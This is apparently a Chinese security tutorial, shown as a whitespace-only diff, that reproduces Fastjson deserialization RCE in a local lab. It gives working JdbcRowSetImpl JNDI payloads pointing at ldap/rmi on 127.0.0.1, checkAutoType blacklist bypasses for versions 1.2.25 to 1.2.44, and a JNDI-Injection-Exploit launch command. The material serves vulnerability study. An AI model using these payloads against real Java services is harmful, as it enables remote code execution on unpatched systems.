 选择下面的`JDK 1.8`的：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmD1sGEPC3oIqb646ib6T3ghkicV1m3ARuZSzBuDcTpb0CtgbKMypZkgcg/640?wx_fmt=png)然后在`Main.py`中写入如下代码：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSON;
-import com.alibaba.fastjson.parser.Feature;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.Feature;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args) {
-        String payload = "{\n" +
-                "    \"a\":{\n" +
-                "        \"@type\":\"java.lang.Class\",\n" +
-                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
-                "    },\n" +
-                "    \"b\":{\n" +
-                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
-                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/ppcjug\",\n" +
-                "        \"autoCommit\":true\n" +
-                "    }\n" +
-                "}";
-        JSON.parse(payload);
-    }
+public class Main {
+    public static void main(String[] args) {
+        String payload = "{\n" +
+                "    \"a\":{\n" +
+                "        \"@type\":\"java.lang.Class\",\n" +
+                "        \"val\":\"com.sun.rowset.JdbcRowSetImpl\"\n" +
+                "    },\n" +
+                "    \"b\":{\n" +
+                "        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n" +
+                "        \"dataSourceName\":\"ldap://127.0.0.1:1389/ppcjug\",\n" +
+                "        \"autoCommit\":true\n" +
+                "    }\n" +
+                "}";
+        JSON.parse(payload);
+    }
 }
 
 
@@ -1133,7 +1133,7 @@ public class Main {
 ![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgmm9OuBBQwiavfN5PxFGE2huPmC98sicvjEiblniajmKRpjOciaOUib5NaUX7A/640?wx_fmt=png)以上为第一种`poc`，在`JDK 8u181`下使用`ldap`测试成功，使用`rmi`测试失败。除此之外，另一种`poc`则需要满足漏洞利用条件为`JDK 6u113`、`7u97` 和 `8u77`之前，例如我们这里重新新建一个项目，并从`[https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/uk/java/technologies/javase/javase8-archive-downloads.html)`处下载`jdk-8u65-windows-x64.exe`并安装。然后利用新安装的`jdk 8u65`来启动`jndi exploit`：
 
 ```
-"C:\Program Files\Java\jdk1.8.0_65\bin\java.exe" -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
+"C:\Program Files\Java\jdk1.8.0_65\bin\java.exe" -jar .\JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 127.0.0.1 -C "calc.exe"
 
 
 ```
@@ -1141,29 +1141,29 @@ public class Main {
 导入`fastjson1.2.25`：
 
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
-    <modelVersion>4.0.0</modelVersion>
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
 
-    <groupId>org.example</groupId>
-    <artifactId>fastjson_8u66_1_2_25</artifactId>
-    <version>1.0-SNAPSHOT</version>
+    <groupId>org.example</groupId>
+    <artifactId>fastjson_8u66_1_2_25</artifactId>
+    <version>1.0-SNAPSHOT</version>
 
-    <properties>
-        <maven.compiler.source>8</maven.compiler.source>
-        <maven.compiler.target>8</maven.compiler.target>
-        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-    </properties>
+    <properties>
+        <maven.compiler.source>8</maven.compiler.source>
+        <maven.compiler.target>8</maven.compiler.target>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    </properties>
 
-    <dependencies>
-        <dependency>
-            <groupId>com.alibaba</groupId>
-            <artifactId>fastjson</artifactId>
-            <version>1.2.25</version>
-        </dependency>
-    </dependencies>
+    <dependencies>
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.25</version>
+        </dependency>
+    </dependencies>
 </project>
 
 
@@ -1172,18 +1172,18 @@ public class Main {
 在`Main.java`中写入如下内容：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args){
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        // ldap 和 rmi都可以
-        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
-        JSONObject.parse(payload);
-    }
+public class Main {
+    public static void main(String[] args){
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        // ldap 和 rmi都可以
+        String payload = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
+        JSONObject.parse(payload);
+    }
 }
 
 
@@ -1196,8 +1196,8 @@ public class Main {
 首先来说说限制，基于`JNDI+RMI`或`JDNI+LADP`进行攻击，会有一定的`JDK`版本限制。
 
 ```
-RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113
-LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191
+RMI利用的JDK版本 ≤ JDK 6u132、7u122、8u113
+LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191
 
 
 ```
@@ -1221,18 +1221,18 @@ LADP利用JDK版本 ≤ JDK 6u211 、7u201、8u191
 第二种`poc`的绕过手法在上面的 “黑白名单机制介绍” 中已经写的很清楚了，直接参考即可。需要注意的是，由于代码是循环去掉`L`和`;`的，所以我们不一定只在头尾各加一个`L`和`;`。由于 1.2.25 的代码中有如下代码：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7Ocgm2ExnqRNq0WxlfZO8sYiclyalMkObM3T6MJ6e1TCvNdBbiaE5RZbFon7w/640?wx_fmt=png)因此我们可以构造如下`poc`：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args){
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        // ldap 和 rmi都可以
-        String payload = "{\"a\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://127.0.0.1:1389/ift2ty\", \"autoCommit\":true\}\}";
-        JSONObject.parse(payload);
-    }
+public class Main {
+    public static void main(String[] args){
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        // ldap 和 rmi都可以
+        String payload = "{\"a\":{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{, \"dataSourceName\":\"ldap://127.0.0.1:1389/ift2ty\", \"autoCommit\":true\}\}";
+        JSONObject.parse(payload);
+    }
 }
 
 
@@ -1245,20 +1245,20 @@ public class Main {
 从上面我们学习了绕过黑白名单的学习，接下来看`JdbcRowSetImpl`利用链的原理。根据`FastJson`反序列化漏洞原理，`FastJson`将`JSON`字符串反序列化到指定的`Java`类时，会调用目标类的`getter`、`setter`等方法。`JdbcRowSetImpl`类的`setAutoCommit()`会调用`connect()`方法，`connect()`函数如下：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmoMU0yJWvB6nSnNpE8uwr19Tl6OiaSsWw7TPUQxwAZcRU8JcW7s7HzPA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmxgHkhH3GbzFAAicVYkXF9JJgfbeKKgicicT9m76ocBeUad8KdY9vooZ5Q/640?wx_fmt=png)我们把这段代码单独拿出来分析：
 
 ```
-private Connection connect() throws SQLException {
-    if (this.conn != null) {
-        return this.conn;
-    } else if (this.getDataSourceName() != null) {
-        try {
-            InitialContext var1 = new InitialContext();
-            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
-            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
-        } catch (NamingException var3) {
-            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
-        }
-    } else {
-        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
-    }
+private Connection connect() throws SQLException {
+    if (this.conn != null) {
+        return this.conn;
+    } else if (this.getDataSourceName() != null) {
+        try {
+            InitialContext var1 = new InitialContext();
+            DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+            return this.getUsername() != null && !this.getUsername().equals("") ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
+        } catch (NamingException var3) {
+            throw new SQLException(this.resBundle.handleGetObject("jdbcrowsetimpl.connect").toString());
+        }
+    } else {
+        return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
+    }
 }
 
 
@@ -1267,8 +1267,8 @@ private Connection connect() throws SQLException {
 一眼就看到了两行异常熟悉的代码：
 
 ```
-InitialContext var1 = new InitialContext();
-DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
+InitialContext var1 = new InitialContext();
+DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
 
 
 ```
@@ -1276,15 +1276,15 @@ DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName());
 我们可以通过一个简单的小`demo`快速了解：
 
 ```
-package org.example;
-import com.sun.rowset.JdbcRowSetImpl;
+package org.example;
+import com.sun.rowset.JdbcRowSetImpl;
 
-public class Main {
-    public static void main(String[] args) throws Exception {
-        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
-        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/ift2ty");
-        JdbcRowSetImpl_inc.setAutoCommit(true);
-    }
+public class Main {
+    public static void main(String[] args) throws Exception {
+        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();
+        JdbcRowSetImpl_inc.setDataSourceName("rmi://127.0.0.1:1099/ift2ty");
+        JdbcRowSetImpl_inc.setAutoCommit(true);
+    }
 }
 
 
@@ -1298,29 +1298,29 @@ public class Main {
 首先先下载`fastjson 1.2.25`：
 
 ```
-<?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0"
-         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
-    <modelVersion>4.0.0</modelVersion>
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+    <modelVersion>4.0.0</modelVersion>
 
-    <groupId>org.example</groupId>
-    <artifactId>fastjson_1_2_42</artifactId>
-    <version>1.0-SNAPSHOT</version>
+    <groupId>org.example</groupId>
+    <artifactId>fastjson_1_2_42</artifactId>
+    <version>1.0-SNAPSHOT</version>
 
-    <properties>
-        <maven.compiler.source>8</maven.compiler.source>
-        <maven.compiler.target>8</maven.compiler.target>
-        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
-    </properties>
+    <properties>
+        <maven.compiler.source>8</maven.compiler.source>
+        <maven.compiler.target>8</maven.compiler.target>
+        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
+    </properties>
 
-    <dependencies>
-        <dependency>
-            <groupId>com.alibaba</groupId>
-            <artifactId>fastjson</artifactId>
-            <version>1.2.42</version>
-        </dependency>
-    </dependencies>
+    <dependencies>
+        <dependency>
+            <groupId>com.alibaba</groupId>
+            <artifactId>fastjson</artifactId>
+            <version>1.2.42</version>
+        </dependency>
+    </dependencies>
 
 </project>
 
@@ -1334,18 +1334,18 @@ public class Main {
 然后`checkAutoType`这里进行判断，仅仅是把原来的`L`和`;`换成了`hash`的形式：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmibIhicUiaLHYQribQnNDT4ULa0UEpynhQ0lYZyYO14xQBliapdjKk1SnWlg/640?wx_fmt=png)所以直接双写`L`和`;`即可：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args){
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        // ldap 和 rmi都可以
-        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
-        JSONObject.parse(payload);
-    }
+public class Main {
+    public static void main(String[] args){
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        // ldap 和 rmi都可以
+        String payload = "{\"@type\":\"LLcom.sun.rowset.JdbcRowSetImpl;;\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
+        JSONObject.parse(payload);
+    }
 }
 
 
@@ -1359,18 +1359,18 @@ public class Main {
 修改之前的`pom.xml`里面的版本为`1.2.43`。直接全局搜索`checkAutoType`，看修改后的代码：![](https://mmbiz.qpic.cn/mmbiz_png/sXbicAlDr12oxdAsH1gOTVTn3PWm7OcgmOMBqRLibVj6yd9D3CZickV8o3BJiajrmKn0Kc6I1Iu9GxK7epJYe8VPeQ/640?wx_fmt=png)意思就是说如果出现连续的两个`L`，就报错。那么问题来了，你也妹对`[`进行限制啊，直接绕：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args){
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        // ldap 和 rmi都可以
-        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
-        JSONObject.parse(payload);
-    }
+public class Main {
+    public static void main(String[] args){
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        // ldap 和 rmi都可以
+        String payload = "{\"@type\":\"[com.sun.rowset.JdbcRowSetImpl\"[{,\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\", \"autoCommit\":true}";
+        JSONObject.parse(payload);
+    }
 }
 
 
@@ -1384,18 +1384,18 @@ public class Main {
 修改之前的`pom.xml`里面的版本为`1.2.44`。这个版本的`fastjson`总算是修复了之前的关于字符串处理绕过黑名单的问题，但是存在之前完美在说`fastjson 1.2.25`版本的第一种`poc`的那个通过`mappings`缓存绕过`checkAutoType`的漏洞，复现如下：
 
 ```
-package org.example;
+package org.example;
 
-import com.alibaba.fastjson.JSONObject;
-import com.alibaba.fastjson.parser.ParserConfig;
+import com.alibaba.fastjson.JSONObject;
+import com.alibaba.fastjson.parser.ParserConfig;
 
-public class Main {
-    public static void main(String[] args){
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-        // ldap 和 rmi都可以
-        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\",\"autoCommit\":true\}\}";
-        JSONObject.parse(payload);
-    }
+public class Main {
+    public static void main(String[] args){
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        // ldap 和 rmi都可以
+        String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://127.0.0.1:1099/ift2ty\",\"autoCommit\":true\}\}";
+        JSONObject.parse(payload);
+    }
 }
 
 
@@ -1431,7 +1431,7 @@ public class Main {
 这个`expectClass`并不是什么陌生的新名词，我们在前置知识里面的`demo`中的这个`Person.class`就是期望类：
 
 ```
-Person person2 = JSON.parseObject(jsonString2, Person.class);
+Person person2 = JSON.parseObject(jsonString2, Person.class);
 
 
 ```
@@ -1451,13 +1451,13 @@ https://paper.seebug.org/1698/
 https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/
 https://www.rc.sb/fastjson/
 https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl利用链/
-https://blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/
+https://blog.weik1.top/2021/09/08/Fastjson 反序列化历史漏洞分析/
 http://blog.topsec.com.cn/fastjson-1-2-24反序列化漏洞深度分析/
 https://xz.aliyun.com/t/7107
 https://www.javasec.org/java-vuls/FastJson.html
 https://www.freebuf.com/articles/web/265904.html
 https://b1ue.cn/archives/506.html
-http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/
+http://xxlegend.com/2017/04/29/title- fastjson 远程反序列化poc的构造和分析/
 https://forum.butian.net/share/1092
 https://www.freebuf.com/vuls/178012.html
 https://www.cnblogs.com/nice0e3/p/14776043.html
@@ -1465,7 +1465,7 @@ https://www.cnblogs.com/nice0e3/p/14601670.html
 http://140.143.242.46/blog/024.html
 https://paper.seebug.org/994/
 https://paper.seebug.org/1192/
-http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/
+http://xxlegend.com/2017/12/06/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/
 https://zhuanlan.zhihu.com/p/544463507
 https://jfrog.com/blog/cve-2022-25845-analyzing-the-fastjson-auto-type-bypass-rce-vulnerability/
 https://www.anquanke.com/post/id/240446
